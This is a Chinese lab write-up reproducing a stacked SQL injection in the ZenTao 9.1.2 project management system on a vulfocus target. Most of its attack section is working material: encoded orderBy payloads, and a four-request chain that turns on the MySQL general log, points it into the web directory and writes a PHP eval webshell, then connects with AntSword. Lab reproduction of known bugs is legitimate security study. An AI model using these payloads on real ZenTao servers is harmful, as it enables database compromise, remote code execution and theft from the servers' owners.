## 禅道-9.1.2-sql SQL注入 

#### 环境搭建

靶机：CentOS7（192.168.2.101）

该漏洞环境已整合到vulfocus靶场中，可一键直接启动



<img src="https://cdn.jsdelivr.net/gh/QJLONG/HUMMER-PIC@master/img/20211231094515.png" style="zoom:80%;" />

<br>

#### 漏洞复现

获取目标版本信息

```http://192.168.2.101:16725/zentaopms/www/index.php?mode=getconfig```

返回结果如下：

```{"version":"9.1.2","requestType":"GET","requestFix":"-","moduleVar":"m","methodVar":"f","viewVar":"t","sessionVar":"zentaosid","sessionName":"zentaosid","sessionID":"nctsn7g0rfu7ov8f4k6nnt4p0k","rand":5320,"expiredTime":"1440","serverTime":1640919729,"ip":"192.168.2.101:16725","name":"","port":""}```

<br>

通过报错信息获取绝对路径

```http://192.168.2.101:16725/zentaopms/www/index.php?m=user1&f=login&referer=L3plbnRhb3Btcy93d3cvaW5kZXgucGhwP21vZGU9Z2V0Y29uZmk=```

![](https://cdn.jsdelivr.net/gh/QJLONG/HUMMER-PIC@master/img/20211231110602.png)

可以得知服务器的绝对路径：**/www/zentaopms/framework/base/router.class.php**

<br>

漏洞点：orderBy处理过程中存在SQL注入问题，可堆叠注入。拿其中一个payload演示编码步骤如下：

1.选择所用payload语句：`select sleep(5)`

2.将SQL语句hex编码：`0x73656c65637420736c656570283529`

3.将hex编码后的参数插入json中：

```{"orderBy":"order limit 1;SET @SQL=0x73656c65637420736c656570283529;PREPARE pord FROM @SQL;EXECUTE pord;-- -","num":"1,1","type":"openedbyme"}```

4.将json数据进行base64编码

```eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMTtTRVQgQFNRTD0weDczNjU2YzY1NjM3NDIwNzM2YzY1NjU3MDI4MzUyOTtQUkVQQVJFIHBvcmQgRlJPTSBAU1FMO0VYRUNVVEUgcG9yZDstLSAtIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ==```

5.将base64编码后的数据插入请求:

```http://192.168.2.101:16725/zentaopms/www/index.php%EF%BC%9Fm=block&f=main&mode=getblockdata&blockid=case&param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMTtTRVQgQFNRTD0weDczNjU2YzY1NjM3NDIwNzM2YzY1NjU3MDI4MzUyOTtQUkVQQVJFIHBvcmQgRlJPTSBAU1FMO0VYRUNVVEUgcG9yZDstLSAtIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ==```

6.注：每一个请求中都需要手动添加refer字段：`Referer:http://192.168.2.101:16725/zentaopms/`

<br>

获取webshell的payload：

```
//set global general_log='on'    			#开启日志
GET /zentaopms/www/index.php?m=block&f=main&mode=getblockdata&blockid=case&param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxO1NFVCBAU1FMPTB4NzM2NTc0MjA2NzZjNmY2MjYxNmMyMDY3NjU2ZTY1NzI2MTZjNWY2YzZmNjczZDI3NmY2ZTI3M2I7UFJFUEFSRSBwb3JkIEZST00gQFNRTDtFWEVDVVRFIHBvcmQ7LS0gLSIsIm51bSI6IjEsMSIsInR5cGUiOiJvcGVuZWRieW1lIn0= HTTP/1.1
Host: 192.168.2.101:16725
Referer:http://192.168.2.101:16725/zentaopms/


//set global general_log_file='/www/zentaopms/module/misc/ext/model/foo.php'  #修改日志路径
GET /zentaopms/www/index.php?m=block&f=main&mode=getblockdata&blockid=case&param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxO1NFVCBAU1FMPTB4NzM2NTc0MjA2NzZjNmY2MjYxNmMyMDY3NjU2ZTY1NzI2MTZjNWY2YzZmNjc1ZjY2Njk2YzY1M2QyNzJmNzc3Nzc3MmY3YTY1NmU3NDYxNmY3MDZkNzMyZjZkNmY2NDc1NmM2NTJmNmQ2OTczNjMyZjY1Nzg3NDJmNmQ2ZjY0NjU2YzJmNjY2ZjZmMmU3MDY4NzAyNzNiO1BSRVBBUkUgcG9yZCBGUk9NIEBTUUw7RVhFQ1VURSBwb3JkOy0tIC0iLCJudW0iOiIxLDEiLCJ0eXBlIjoib3BlbmVkYnltZSJ9 HTTP/1.1
Host: 192.168.2.101:16725
Referer:http://192.168.2.101:16725/zentaopms/


//select '<?php @eval($_POST[1])?>'  		#写入shell语句
GET /zentaopms/www/index.php?m=block&f=main&mode=getblockdata&blockid=case&param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxO1NFVCBAU1FMPTB4NzM2NTZjNjU2Mzc0MjAyNzNjM2Y3MDY4NzAyMDQwNjU3NjYxNmMyODI0NWY1MDRmNTM1NDViMzE1ZDI5M2YzZTI3M2I7UFJFUEFSRSBwb3JkIEZST00gQFNRTDtFWEVDVVRFIHBvcmQ7LS0gLSIsIm51bSI6IjEsMSIsInR5cGUiOiJvcGVuZWRieW1lIn0= HTTP/1.1
Host: 192.168.2.101:16725
Referer:http://192.168.2.101:16725/zentaopms/


//set global general_log='off'  			 #关闭日志文件
GET /zentaopms/www/index.php?m=block&f=main&mode=getblockdata&blockid=case&param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxO1NFVCBAU1FMPTB4NzM2NTc0MjA2NzZjNmY2MjYxNmMyMDY3NjU2ZTY1NzI2MTZjNWY2YzZmNjczZDI3NmY2NjY2MjczYjtQUkVQQVJFIHBvcmQgRlJPTSBAU1FMO0VYRUNVVEUgcG9yZDstLSAtIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ== HTTP/1.1
Host: 192.168.2.101:16725
Referer:http://192.168.2.101:16725/zentaopms/
```

访问webshell获取flag：链接：http://118.193.36.37:10363/zentaopms/module/misc/ext/model/foo.php 密码：1

用AntSword连接

![](https://cdn.jsdelivr.net/gh/QJLONG/HUMMER-PIC@master/img/20211231114221.png)

<br>



#### 漏洞分析  

##### 用到的mysql命令

```mysql
show variables like '%secure%';    #查看安全
show variables like 'general_log%';  #查看日志
set global general_log_file='/www/zentaopms/module/misc/ext/model/foo.php';   #设置日志文件目录
set global general_log='on';  #开启日志
```

漏洞发现：参考：[代码审计-禅道9.2.1-sql注入 - )ops - 博客园 (cnblogs.com)](https://www.cnblogs.com/0ops/p/11832059.html)

漏洞利用：参考：[zentaopms-9.1.2-sql SQL注入 (fofapro.github.io)](https://fofapro.github.io/vulfocus/#/writeup/zentaopms_9.1.2_sql_SQL注入/zentaopms_9.1.2_sql_SQL注入?id=general_log方式成功)

